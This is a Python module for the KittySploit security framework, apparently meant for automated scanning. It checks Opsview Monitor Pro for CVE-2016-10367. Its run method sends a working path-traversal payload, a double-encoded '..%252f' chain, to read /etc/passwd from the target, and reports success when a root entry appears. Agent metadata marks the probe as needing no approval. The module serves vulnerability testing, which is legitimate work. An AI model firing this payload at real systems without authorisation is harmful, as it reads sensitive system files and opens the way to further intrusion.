#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Opsview Monitor Pro prior to 5."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Opsview Monitor Pro - Local File Inclusion Detection',
        'description': 'Opsview Monitor Pro prior to 5.1.0.162300841, prior to 5.0.2.27475, prior to 4.6.4.162391051, and 4.5.x without a certain 2016 security patch is vulnerable to unauthenticated local file inclusion and can be exploited by issuing a specially crafted HTTP GET request utilizing a simple bypass.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2016', 'opsview', 'lfi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=18774',
            'https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2016-016/?fid=8341',
            'https://nvd.nist.gov/vuln/detail/CVE-2016-10367',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2016-10367',
    }

    def run(self):
        r = self.http_request(method="GET", path='/monitoring/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd', allow_redirects=False)
        if not r or r.status_code != 404:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Opsview Monitor Pro - Local File Inclusion detected",
                path='/monitoring/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd',
            )
            return True
        return False

